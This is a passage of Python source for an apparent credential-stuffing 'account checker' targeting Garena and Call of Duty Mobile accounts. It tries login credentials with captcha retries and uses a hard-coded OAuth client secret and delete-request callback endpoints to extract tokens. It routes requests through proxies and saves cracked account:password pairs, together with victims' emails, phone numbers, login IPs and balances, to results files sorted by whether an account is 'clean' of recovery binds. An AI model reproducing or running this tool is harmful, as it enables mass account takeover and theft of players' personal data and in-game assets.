                    logger.warning(f"{EMOJI['error']} Login failed: Invalid credentials")
                    return None
                elif 'captcha' in error_msg.lower():
                    logger.warning(f"{EMOJI['warning']} Login failed: Captcha required")
                    time.sleep(3)
                    continue
                else:
                    logger.warning(f"{EMOJI['error']} Login failed: {error_msg}")
                    return None
            return sso_key
        except requests.RequestException as e:
            logger.error(f"{EMOJI['error']} Login request failed (attempt {attempt+1}): {e}")
            if attempt<retries-1: time.sleep(2)
    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time()*1000))
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_headers = {
            "Host":"100082.connect.garena.com","Connection":"keep-alive","sec-ch-ua-platform":"\"Android\"",
            "User-Agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept":"application/json, text/plain, */*","sec-ch-ua":"\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Android WebView\";v=\"144\"",
            "Content-Type":"application/x-www-form-urlencoded;charset=UTF-8","sec-ch-ua-mobile":"?1","Origin":"https://100082.connect.garena.com",
            "X-Requested-With":"com.garena.game.codm","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty",
            "Referer":"https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            "Accept-Encoding":"gzip, deflate, br, zstd","Accept-Language":"en-US,en;q=0.9"
        }
        import uuid
        device_id = f"02-{str(uuid.uuid4())}"
        grant_data = f"client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}"
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get("code", "")
        if not auth_code: return "", "", ""
        token_url = "https://100082.connect.garena.com/oauth/token/exchange"
        token_headers = {
            "User-Agent":"GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Content-Type":"application/x-www-form-urlencoded","Host":"100082.connect.garena.com",
            "Connection":"Keep-Alive","Accept-Encoding":"gzip"
        }
        token_data = f"grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        return token_json.get("access_token",""), token_json.get("open_id",""), token_json.get("uid","")
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error getting CODM access token: {e}")
        return "", "", ""

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        old_headers = {"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "user-agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
                       "referer":"https://auth.garena.com/"}
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get("Location", "")
        if "err=3" in location: return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        aos_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        aos_headers = {"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                       "user-agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
                       "referer":"https://100082.connect.garena.com/","x-requested-with":"com.garena.game.codm"}
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get("Location", "")
        if "err=3" in aos_location: return None, "no_codm"
        elif "token=" in aos_location:
            token = aos_location.split("token=")[-1].split('&')[0]
            return token, "success"
        return None, "unknown_error"
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error processing CODM callback: {e}")
        return None, "error"

def get_codm_user_info(session, token):
    try:
        import base64
        parts = token.split('.')
        if len(parts)==3:
            payload = parts[1]
            padding = 4 - len(payload)%4
            if padding!=4: payload += '='*padding
            decoded = base64.urlsafe_b64decode(payload)
            jwt_data = json.loads(decoded)
            user_data = jwt_data.get("user", {})
            if user_data:
                return {"codm_nickname":user_data.get("codm_nickname", user_data.get("nickname","N/A")),
                        "codm_level":user_data.get("codm_level","N/A"), "region":user_data.get("region","N/A"),
                        "uid":user_data.get("uid","N/A"), "open_id":user_data.get("open_id","N/A"),
                        "t_open_id":user_data.get("t_open_id","N/A")}
        url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        headers = {"accept":"application/json, text/plain, */*","codm-delete-token":token,
                   "origin":"https://delete-request-aos.codm.garena.co.id","referer":"https://delete-request-aos.codm.garena.co.id/",
                   "user-agent":"Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
                   "x-requested-with":"com.garena.game.codm"}
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get("user", {})
        if user_data:
            return {"codm_nickname":user_data.get("codm_nickname","N/A"), "codm_level":user_data.get("codm_level","N/A"),
                    "region":user_data.get("region","N/A"), "uid":user_data.get("uid","N/A"),
                    "open_id":user_data.get("open_id","N/A"), "t_open_id":user_data.get("t_open_id","N/A")}
        return {}
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error getting CODM user info: {e}")
        return {}

def fetch_codm_player_details(session, uid):
    return {"banned": False}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"{EMOJI['warning']} No CODM access token")
            return has_codm, codm_info
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == "no_codm":
            logger.info(f"{EMOJI['info']} No CODM detected")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"{EMOJI['warning']} CODM callback failed: {status}")
            return has_codm, codm_info
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"{EMOJI['game']} CODM detected: Level {codm_info.get('codm_level', 'N/A')}")
            uid_val = codm_info.get('uid')
            if uid_val and uid_val != 'N/A':
                extra = fetch_codm_player_details(session, uid_val)
                codm_info['banned'] = extra.get('banned', False)
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error checking CODM: {e}")
    return has_codm, codm_info

def display_codm_info(account_details, codm_info, leak_info=None):
    if isinstance(account_details, str):
        account_details = {
            'username': account_details, 'nickname': 'N/A', 'email': account_details,
            'personal': {'mobile_no': 'N/A', 'country': 'N/A', 'id_card': 'N/A'},
            'bind_status': 'N/A', 'security_status': 'N/A', 'profile': {'shell_balance': 'N/A'},
            'status': {'account_status': 'N/A'}, 'email_verified': False,
            'security': {'two_step_verify': False, 'authenticator_app': False, 'facebook_account': None},
            'game_info': []
        }

    is_clean = account_details.get('is_clean', False)
    clean_badge = f"{Fore.GREEN}✓ CLEAN{Style.RESET_ALL}" if is_clean else f"{Fore.RED}✗ NOT CLEAN{Style.RESET_ALL}"
    
    lines = []
    arrow = "→ "
    
    lines.append(f"{arrow}{Fore.CYAN}════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
    lines.append(f"{arrow}{Fore.WHITE}🔐 ACCOUNT CHECK SUCCESS  {clean_badge}{Style.RESET_ALL}")
    lines.append(f"{arrow}{Fore.CYAN}────────────────────────────────────────────────────────────────{Style.RESET_ALL}")
    
    username = account_details.get('username', 'N/A')
    shell = account_details.get('profile', {}).get('shell_balance', 0)
    shell_color = Fore.GREEN if shell > 0 else Fore.RED
    email = account_details.get('email', 'N/A')
    email_verified = account_details.get('email_verified', False)
    email_status = f"{Fore.GREEN}✓ Verified{Style.RESET_ALL}" if email_verified else f"{Fore.RED}✗ Not Verified{Style.RESET_ALL}"
    mobile_raw = account_details.get('personal', {}).get('mobile_no', 'N/A')
    mobile_display = f"+{mobile_raw}" if mobile_raw not in ['Not Set', 'N/A', ''] and not str(mobile_raw).startswith('+') else mobile_raw
    if mobile_raw in ['Not Set', 'N/A', '']:
        mobile_display = "N/A"
    fb_data = account_details.get('security', {}).get('facebook_account', None)
    if isinstance(fb_data, dict):
        fb_username = fb_data.get('fb_username', 'N/A')
        fb_status = f"{Fore.GREEN}✓ CONNECTED{Style.RESET_ALL}" if fb_username else f"{Fore.YELLOW}⚠️ DELETED{Style.RESET_ALL}"
    else:
        fb_username = "N/A"
        fb_status = f"{Fore.RED}✗ NOT CONNECTED{Style.RESET_ALL}"
    
    lines.append(f"{arrow}{Fore.YELLOW}🔑 LOGIN:{Style.RESET_ALL} {Fore.WHITE}{username}{Style.RESET_ALL}")
    lines.append(f"{arrow}{Fore.YELLOW}💰 SHELL:{Style.RESET_ALL} {shell_color}{shell}{Style.RESET_ALL}")
    lines.append(f"{arrow}{Fore.YELLOW}📧 EMAIL:{Style.RESET_ALL} {email} ({email_status})")
    lines.append(f"{arrow}{Fore.YELLOW}📱 MOBILE:{Style.RESET_ALL} {mobile_display}")
    lines.append(f"{arrow}{Fore.YELLOW}📘 FB USER:{Style.RESET_ALL} {fb_username}")
    lines.append(f"{arrow}{Fore.YELLOW}FB STATUS:{Style.RESET_ALL} {fb_status}")
    
    last_login = account_details.get('last_login', 'Unknown')
    last_login_where = account_details.get('last_login_where', 'N/A')
    login_ip = account_details.get('ip_for_msg', 'N/A')
    two_step = account_details.get('security', {}).get('two_step_verify', False)
    auth_app = account_details.get('security', {}).get('authenticator_app', False)
    security_parts = []
    security_parts.append(f"{Fore.GREEN}✓ 2FA{Style.RESET_ALL}" if two_step else f"{Fore.RED}✗ 2FA{Style.RESET_ALL}")
    security_parts.append(f"{Fore.GREEN}✓ Auth{Style.RESET_ALL}" if auth_app else f"{Fore.RED}✗ Auth{Style.RESET_ALL}")
    bind_status = account_details.get('bind_status', 'N/A')
    
    lines.append(f"{arrow}{Fore.YELLOW}🕒 LAST LOGIN:{Style.RESET_ALL} {last_login}")
    lines.append(f"{arrow}{Fore.YELLOW}🌍 LOCATION:{Style.RESET_ALL} {last_login_where}")
    lines.append(f"{arrow}{Fore.YELLOW}🌐 IP:{Style.RESET_ALL} {login_ip}")
    lines.append(f"{arrow}{Fore.YELLOW}🛡️ SECURITY:{Style.RESET_ALL} {' | '.join(security_parts)}")
    lines.append(f"{arrow}{Fore.YELLOW}📌 BINDS:{Style.RESET_ALL} {bind_status}")
    
    lines.append(f"{arrow}{Fore.CYAN}────────────────────────────────────────────────────────────────{Style.RESET_ALL}")
    
    if codm_info and codm_info.get('codm_level', 'N/A') != 'N/A':
        codm_level = str(codm_info.get('codm_level', 'N/A'))
        codm_nick = str(codm_info.get('codm_nickname', 'N/A'))
        codm_region = str(codm_info.get('region', 'N/A'))
        codm_uid = str(codm_info.get('uid', 'N/A'))
        is_banned = bool(codm_info.get('banned', False))
        banned_status = f"{Fore.RED}🔴 BANNED{Style.RESET_ALL}" if is_banned else f"{Fore.GREEN}🟢 ACTIVE{Style.RESET_ALL}"
        region_flag = get_country_emoji(codm_region)
        
        lines.append(f"{arrow}{Fore.MAGENTA}⚡ CALL OF DUTY MOBILE ⚡{Style.RESET_ALL}")
        lines.append(f"{arrow}{Fore.YELLOW}🎯 LEVEL:{Style.RESET_ALL} {Fore.CYAN}{codm_level}{Style.RESET_ALL}")
        lines.append(f"{arrow}{Fore.YELLOW}🎮 IGN:{Style.RESET_ALL} {Fore.GREEN}{codm_nick}{Style.RESET_ALL}")
        lines.append(f"{arrow}{Fore.YELLOW}🌍 SERVER:{Style.RESET_ALL} {region_flag} {codm_region}")
        lines.append(f"{arrow}{Fore.YELLOW}🆔 UID:{Style.RESET_ALL} {codm_uid}")
        lines.append(f"{arrow}{Fore.YELLOW}🚫 BANNED?:{Style.RESET_ALL} {banned_status}")
        lines.append(f"{arrow}{Fore.CYAN}────────────────────────────────────────────────────────────────{Style.RESET_ALL}")
    
    game_list = account_details.get('game_info', [])
    if game_list:
        lines.append(f"{arrow}{Fore.MAGENTA}🎮 OTHER CONNECTED GAMES{Style.RESET_ALL}")
        for g in game_list:
            lines.append(f"{arrow}  • {g.get('game', 'Unknown')} → {Fore.CYAN}{g.get('role', 'N/A')}{Style.RESET_ALL}")
        lines.append(f"{arrow}{Fore.CYAN}────────────────────────────────────────────────────────────────{Style.RESET_ALL}")
    
    lines.append(f"{arrow}{Fore.CYAN}════════════════════════════════════════════════════════════════{Style.RESET_ALL}")
    
    for line in lines:
        console.print(line)
    console.print()
    return ""

# ================================
# 🗂️ Save Functions (unchanged)
# ================================
def save_game_folder(account, password, details, codm_info, game_connections, result_folder='Results'):
    try:
        games_folder = os.path.join(result_folder, 'Games')
        os.makedirs(games_folder, exist_ok=True)
        email = details.get('email', 'N/A')
        email_verified = "Yes" if details.get('email_verified', False) else "No"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        shell = details.get('profile', {}).get('shell_balance', 0)
        country = details.get('personal', {}).get('country', 'N/A')
        last_login = details.get('last_login', 'Unknown')
        last_login_where = details.get('last_login_where', 'N/A')
        login_ip = details.get('ip_for_msg', 'N/A')
        is_clean = details.get('is_clean', False)
        clean_status = "CLEAN" if is_clean else "NOT CLEAN"
        binds = ', '.join(details.get('binds', [])) if details.get('binds') else 'None'
        fb_account = details.get('security', {}).get('facebook_account') or {}
        fb_status = "False"
        fb_name_line = ""
        if isinstance(fb_account, dict):
            fb_uname = fb_account.get('fb_username', '')
            if fb_uname:
                fb_status = "True"
                fb_name_line = f"FB Name: {fb_uname}\n"
            else:
                fb_status = "Deleted"
        base_entry = (f"{account}:{password}\nEmail: {email} ({email_verified})\nMobile: {mobile}\nShell: {shell}\nCountry: {country}\nLast Login: {last_login}\nLogin Location: {last_login_where}\nLogin IP: {login_ip}\nBinds: {binds}\nFB STATUS: {fb_status}\n{fb_name_line}STATUS: {clean_status}\n")
        game_file_map = {
            'CODM':'CODM.txt','FREEFIRE':'FreeFire.txt','FREE FIRE':'FreeFire.txt','ROV':'ROV.txt',
            'DELTA FORCE':'DeltaForce.txt','AOV':'AOV.txt','SPEED DRIFTERS':'SpeedDrifters.txt',
            'BLACK CLOVER M':'BlackCloverM.txt','GARENA UNDAWN':'Undawn.txt','FC ONLINE':'FCOnline.txt',
            'FC ONLINE M':'FCOnlineM.txt','MOONLIGHT BLADE':'MoonlightBlade.txt','FAST THRILL':'FastThrill.txt',
            'THE WORLD OF WAR':'WorldOfWar.txt'
        }
        saved_games = set()
        for g in game_connections:
            gname = g.get('game', '').upper()
            grole = g.get('role', 'N/A')
            gregion = g.get('region', 'N/A')
            if gname in saved_games: continue
            saved_games.add(gname)
            fname = game_file_map.get(gname, f"{gname.replace(' ', '_')}.txt")
            fpath = os.path.join(games_folder, fname)
            if gname == 'CODM' and codm_info:
                codm_level = codm_info.get('codm_level', 'N/A')
                codm_uid = codm_info.get('uid', 'N/A')
                entry = base_entry + f"CODM IGN: {grole}\nCODM UID: {codm_uid}\nCODM Level: {codm_level}\nCODM Region: {gregion}\n"
            else:
                entry = base_entry + f"{gname} IGN: {grole}\n{gname} Region: {gregion}\n"
            identifier = f"{account}:{password}"
            already_saved = False
            if os.path.exists(fpath):
                with open(fpath, 'r', encoding='utf-8') as f:
                    if identifier in f.read(): already_saved = True
            if not already_saved:
                with open(fpath, 'a', encoding='utf-8') as f:
                    f.write(entry.strip() + "\n\n")
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error saving game folder for {account}: {e}")

def save_codm_account(account, password, codm_info, account_details, account_number=1, leak_info=None):
    try:
        if not codm_info or not codm_info.get('codm_level'): return
        codm_level = int(codm_info.get('codm_level', 0))
        codm_nickname = codm_info.get('codm_nickname', 'N/A')
        region = codm_info.get('region', 'N/A').upper()
        uid = codm_info.get('uid', 'N/A')
        shell_balance = account_details.get('profile', {}).get('shell_balance', 0)
        country = account_details.get('personal', {}).get('country', 'N/A').upper() if account_details.get('personal', {}).get('country', 'N/A') != 'N/A' else region
        is_clean = account_details.get('is_clean', False)
        binds = ', '.join(account_details.get('binds', [])) if account_details.get('binds') else 'None'
        account_status = account_details.get('status', {}).get('account_status', 'N/A')
        last_login = account_details.get('last_login', 'Unknown')
        last_login_where = account_details.get('last_login_where', 'N/A')
        login_ip = account_details.get('ip_for_msg', 'N/A')
        email = account_details.get('email', 'N/A')
        email_verified = "Yes" if account_details.get('email_verified', False) else "No"
        mobile = account_details.get('personal', {}).get('mobile_no', 'N/A')
        country_emoji = get_country_emoji(country)
        fb_data = account_details.get('security', {}).get('facebook_account', None)
        fb_status = "False"
        fb_name_line = ""
        if isinstance(fb_data, dict):
            fb_username = fb_data.get('fb_username', '')
            if fb_username:
                fb_status = "True"
                fb_name_line = f"FB Name: {fb_username}\n"
            else:
                fb_status = "Deleted"
        os.makedirs('Results', exist_ok=True)
        account_entry = f"""{account}:{password}
CODM: {codm_nickname}
UID: {uid}
Level: {codm_level}
Shell: {shell_balance}
Region: {region} {country_emoji}
Login Country: {country}
Last Login: {last_login}
Login Location: {last_login_where}
Login IP: {login_ip}
Email: {email} ({email_verified})
Mobile: {mobile}
STATUS: {account_status.upper()}
Binds: {binds}
FB STATUS: {fb_status}
{fb_name_line}STATUS: {'CLEAN' if is_clean else 'NOT CLEAN'}"""
        if is_clean:
            clean_file = 'Results/Clean.txt'
            existing = []
            if os.path.exists(clean_file):
                with open(clean_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if f"{account}:{password}" in content: return
                    entries = content.split('\n\n')
                    for entry in entries:
                        entry = entry.strip()
                        if entry:
                            lines = entry.split('\n')
                            cleaned = '\n'.join([line for line in lines if not re.match(r'^\d+\.$', line.strip())])
                            if cleaned.strip():
                                m = re.search(r'Level: (\d+)', cleaned)
                                if m: existing.append((int(m.group(1)), cleaned.strip()))
            existing.append((codm_level, account_entry.strip()))
            existing.sort(key=lambda x: x[0], reverse=True)
            with open(clean_file, 'w', encoding='utf-8') as f:
                for lvl, entry in existing: f.write(f"{entry}\n\n")
            logger.info(f"{EMOJI['success']} Saved to Clean.txt")
        else:
            not_clean_file = 'Results/Not_Clean.txt'
            existing = []
            if os.path.exists(not_clean_file):
                with open(not_clean_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if f"{account}:{password}" in content: return
                    entries = content.split('\n\n')
                    for entry in entries:
                        entry = entry.strip()
                        if entry:
                            lines = entry.split('\n')
                            cleaned = '\n'.join([line for line in lines if not re.match(r'^\d+\.$', line.strip())])
                            if cleaned.strip():
                                m = re.search(r'Level: (\d+)', cleaned)
                                if m: existing.append((int(m.group(1)), cleaned.strip()))
            existing.append((codm_level, account_entry.strip()))
            existing.sort(key=lambda x: x[0], reverse=True)
            with open(not_clean_file, 'w', encoding='utf-8') as f:
                for lvl, entry in existing: f.write(f"{entry}\n\n")
            logger.info(f"{EMOJI['success']} Saved to Not_Clean.txt")
        if shell_balance > 0:
            shell_file = 'Results/Shell.txt'
            existing = []
            if os.path.exists(shell_file):
                with open(shell_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                    if f"{account}:{password}" in content: return
                    entries = content.split('\n\n')
                    for entry in entries:
                        entry = entry.strip()
                        if entry:
                            lines = entry.split('\n')
                            cleaned = '\n'.join([line for line in lines if not re.match(r'^\d+\.$', line.strip())])
                            if cleaned.strip():
                                m = re.search(r'Level: (\d+)', cleaned)
                                if m: existing.append((int(m.group(1)), cleaned.strip()))
            existing.append((codm_level, account_entry.strip()))
            existing.sort(key=lambda x: x[0], reverse=True)
            with open(shell_file, 'w', encoding='utf-8') as f:
                for lvl, entry in existing: f.write(f"{entry}\n\n")
            logger.info(f"{EMOJI['success']} Saved to Shell.txt")
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error saving CODM account {account}: {e}")

def save_account_details(account, details, codm_info=None, password=None, account_number=1, leak_info=None):
    try:
        os.makedirs('Results', exist_ok=True)
        if codm_info and codm_info.get('codm_level'):
            save_codm_account(account, password, codm_info, details, account_number, leak_info)
        with open('Results/full_details.txt', 'a', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write(f"Account: {account}\nPassword: {password}\n")
            f.write(f"UID: {details.get('uid', 'N/A')}\nUsername: {details.get('username', 'N/A')}\n")
            f.write(f"Nickname: {details.get('nickname', 'N/A')}\nEmail: {details.get('email', 'N/A')}\n")
            f.write(f"Phone: {details.get('personal', {}).get('mobile_no', 'N/A')}\n")
            f.write(f"Country: {details.get('personal', {}).get('country', 'N/A')}\n")
            f.write(f"Shell Balance: {details.get('profile', {}).get('shell_balance', 0)}\n")
            f.write(f"Account Status: {details.get('status', {}).get('account_status', 'N/A')}\n")
            f.write(f"Clean Status: {'CLEAN' if details.get('is_clean', False) else 'NOT CLEAN'}\n")
            f.write(f"Binds: {', '.join(details.get('binds', [])) if details.get('binds') else 'None'}\n")
            if codm_info and codm_info.get('codm_level'):
                f.write(f"CODM Name: {codm_info.get('codm_nickname', 'N/A')}\n")
                f.write(f"CODM UID: {codm_info.get('uid', 'N/A')}\n")
                f.write(f"CODM Region: {codm_info.get('region', 'N/A')}\n")
                f.write(f"CODM Level: {codm_info.get('codm_level', 'N/A')}\n")
                f.write(f"Banned: {codm_info.get('banned', False)}\n")
            f.write("="*60 + "\n\n")
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error saving account details: {e}")

def save_clean_or_notclean(account, password, details, codm_info, result_folder='Results'):
    try:
        if not codm_info or not codm_info.get('codm_nickname') or codm_info.get('codm_nickname') == 'N/A': return
        os.makedirs(result_folder, exist_ok=True)
        codm_nickname = codm_info.get('codm_nickname', 'N/A')
        codm_uid = codm_info.get('uid', 'N/A')
        codm_level = codm_info.get('codm_level', 'N/A')
        codm_region = codm_info.get('region', 'N/A')
        email = details.get('email', 'N/A')
        email_verified = details.get('email_verified', False)
        email_ver = "Yes" if email_verified else "No"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        fb_data = details.get('security', {}).get('facebook_account') or {}
        fb_linked = details.get('security', {}).get('facebook_connected') or (True if fb_data else False)
        fb_status = "True" if fb_linked else "False"
        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        ipk = details.get('ip_for_msg', 'N/A')
        ipc = details.get('country', 'N/A')
        last_login = details.get('last_login', 'Unknown')
        last_login_where = details.get('last_login_where', 'N/A')
        account_status = details.get('status', {}).get('account_status', 'N/A')
        binds = ', '.join(details.get('binds', [])) if details.get('binds') else 'None'
        is_clean = details.get('is_clean', False)
        clean_status = "CLEAN" if is_clean else "NOT CLEAN"
        country_emoji = get_country_emoji(codm_region)
        content = f"""
{account}:{password}
CODM: {codm_nickname}
UID: {codm_uid}
Level: {codm_level}
Shell: {shell}
Region: {codm_region} {country_emoji}
Login Country: {ipc}
Last Login: {last_login}
Login Location: {last_login_where}
Login IP: {ipk}
Email: {email} ({email_ver})
Mobile: {mobile}
STATUS: {account_status}
Binds: {binds}
FB STATUS: {fb_status}
STATUS: {clean_status}
"""
        file_path = os.path.join(result_folder, 'clean.txt') if is_clean else os.path.join(result_folder, 'notclean.txt')
        identifier = f"{account}:{password}"
        if os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8") as f:
                if identifier in f.read(): return
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(content.strip() + "\n\n")
        if codm_info and codm_info.get('codm_nickname') and codm_info.get('codm_nickname') != 'N/A':
            save_codm_account(account, password, codm_info, details)
    except Exception: pass

def save_account_details_full(account, details, codm_info=None, password=None, result_folder='Results'):
    try:
        os.makedirs(result_folder, exist_ok=True)
        with open(os.path.join(result_folder, 'full_details.txt'), 'a', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write(f"Account: {account}\nPassword: {password}\n")
            f.write(f"UID: {details['uid']}\nUsername: {details['username']}\n")
            f.write(f"Nickname: {details['nickname']}\nEmail: {details['email']}\n")
            f.write(f"Phone: {details['personal']['mobile_no']}\n")
            f.write(f"Country: {details['personal']['country']}\n")
            f.write(f"Shell Balance: {details['profile']['shell_balance']}\n")
            f.write(f"Account Status: {details['status']['account_status']}\n")
            f.write(f"Is Clean: {details.get('is_clean', False)}\n")
            if codm_info:
                f.write(f"CODM Name: {codm_info.get('codm_nickname', 'N/A')}\n")
                f.write(f"CODM UID: {codm_info.get('uid', 'N/A')}\n")
                f.write(f"CODM Region: {codm_info.get('region', 'N/A')}\n")
                f.write(f"CODM Level: {codm_info.get('codm_level', 'N/A')}\n")
                f.write(f"Banned: {codm_info.get('banned', False)}\n")
            f.write("="*60 + "\n\n")
    except Exception: pass

def parse_account_details(data):
    user_info = data.get('user_info', {})
    account_info = {
        'uid': user_info.get('uid', 'N/A'), 'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'), 'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'security': {
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
        },
        'personal': {
            'country': user_info.get('acc_country', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
        },
        'profile': {'shell_balance': user_info.get('shell', 0)},
        'status': {'account_status': "Active" if user_info.get('status',0)==1 else "Inactive"},
        'binds': [], 'game_info': []
    }
    if account_info['email'] not in ['N/A','',None] and '@' in account_info['email'] and '****' not in account_info['email']:
        account_info['binds'].append('Email')
    if account_info['personal']['mobile_no'] not in ['N/A','',None] and account_info['personal']['mobile_no'].strip():
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    if account_info['binds']:
        account_info['is_clean'] = False
        account_info['bind_status'] = f"Bound ({', '.join(account_info['binds'])})"
    else:
        account_info['is_clean'] = True
        account_info['bind_status'] = "Clean"
    return account_info

def get_game_connections(session, account):
    game_info = []
    valid_regions = {'sg','ph','my','tw','th','id','in','vn'}
    game_mappings = {
        'tw': {"100082":"CODM","100067":"FREE FIRE","100070":"SPEED DRIFTERS","100130":"BLACK CLOVER M","100105":"GARENA UNDAWN","100050":"ROV","100151":"DELTA FORCE","100147":"FAST THRILL","100107":"MOONLIGHT BLADE"},
        'th': {"100067":"FREEFIRE","100055":"ROV","100082":"CODM","100151":"DELTA FORCE","100105":"GARENA UNDAWN","100130":"BLACK CLOVER M","100070":"SPEED DRIFTERS","32836":"FC ONLINE","100071":"FC ONLINE M","100124":"MOONLIGHT BLADE"},
        'vn': {"32837":"FC ONLINE","100072":"FC ONLINE M","100054":"ROV","100137":"THE WORLD OF WAR"},
        'default': {"100082":"CODM","100067":"FREEFIRE","100151":"DELTA FORCE","100105":"GARENA UNDAWN","100057":"AOV","100070":"SPEED DRIFTERS","100130":"BLACK CLOVER M","100055":"ROV"}
    }
    try:
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Pragma":"no-cache","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time()*1000)}"
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30, proxies=PROXIES)
        token_json = token_response.json()
        access_token = token_json.get("access_token", "")
        if not access_token: return []
        inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
        inspect_headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Pragma":"no-cache","Accept":"*/*","Content-Type":"application/json"}
        inspect_data = {"token":access_token}
        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30, proxies=PROXIES)
        inspect_json = inspect_response.json()
        session_key_roles = inspect_response.cookies.get('session_key')
        if not session_key_roles: return []
        uac = inspect_json.get("uac","ph").lower()
        region = uac if uac in valid_regions else 'ph'
        if region=='th' or region=='in': base_domain = "termgame.com"
        elif region=='id': base_domain = "kiosgamer.co.id"
        elif region=='vn': base_domain = "napthe.vn"
        else: base_domain = f"shop.garena.{region}"
        applicable_games = game_mappings.get(region, game_mappings['default'])
        for app_id, game_name in applicable_games.items():
            roles_url = f"https://{base_domain}/api/shop/apps/roles"
            params_roles = {'app_id':app_id}
            headers_roles = {'User-Agent':"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","Accept":"application/json, text/plain, */*",
                             'Referer':f"https://{base_domain}/?app={app_id}",'Cookie':f"session_key={session_key_roles}"}
            try:
                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30, proxies=PROXIES)
                roles_data = roles_response.json()
                role = None
                if isinstance(roles_data.get("role"),list) and roles_data["role"]: role = roles_data["role"][0]
                elif app_id in roles_data and isinstance(roles_data[app_id],list) and roles_data[app_id]:
                    candidate = roles_data[app_id][0]
                    if isinstance(candidate,dict): role = candidate.get("role") or candidate.get("user_id")
                    else: role = str(candidate)
                elif isinstance(roles_data,list) and roles_data:
                    first = roles_data[0]
                    if isinstance(first,dict) and first.get("role"): role = first.get("role")
                if role:
